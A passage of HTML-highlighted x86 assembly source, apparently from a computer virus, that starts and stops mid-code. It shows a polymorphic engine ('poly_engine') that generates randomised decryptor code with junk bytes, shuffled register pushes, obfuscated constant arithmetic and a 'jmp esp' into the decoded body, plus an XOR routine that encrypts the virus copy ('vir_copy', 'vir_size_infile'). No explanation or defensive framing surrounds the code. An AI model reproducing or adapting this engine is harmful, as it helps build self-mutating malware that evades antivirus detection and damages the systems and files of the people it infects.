                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_eax</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">eblo</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5051EB10h</span><span class="sc0">

</span><span class="sc5">random_eax</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_ax</span><span class="sc0">
                        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_ax</span><span class="sc0">
                        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">xor_eblo</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">eblo</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">random_ax</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">poly_engine</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__a1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_ax</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__a1</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">poly_entrypoint</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@kbase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01010101h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">push_num</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">push_num</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">push_num</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">push_num</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_out_cmd</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_copy</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">__cycle_1</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_out_cmd</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">push_num</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regbuf</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">push_num</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_out_cmd</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__3</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regbuf</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">movsd</span><span class="sc0">
                        </span><span class="sc6">movsd</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">


                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_eax</span><span class="sc0">

                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x0</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x1</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x2</span><span class="sc0">

</span><span class="sc5">__x3</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_push_all</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__yy</span><span class="sc0">

</span><span class="sc5">__x2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F081h</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__xx</span><span class="sc0">

</span><span class="sc5">__x1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C081h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__xx</span><span class="sc0">

</span><span class="sc5">__x0</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E881h</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">__xx</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">regbuf</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">push_num</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">__yy</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_copy</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__cycle_1</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_push_all</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_out_cmd</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4FFh</span><span class="sc0">  </span><span class="sc1">; jmp esp</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">__a2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_ax</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__a2</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">xor_copy</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_copy</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">poly_push_all</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__1</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regbuf</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">push_num</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__2</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_rnd_reg</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; esp</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; ebp</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">naebka_8</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">naebka_1</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">naebka_5</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">replace_buf</span><span class="sc0">

</span><span class="sc5">poly_out_cmd</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">push_num</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01010101h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">push_num</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0101h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__ret</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">push_num</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">reg1</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_reg</span><span class="sc0">
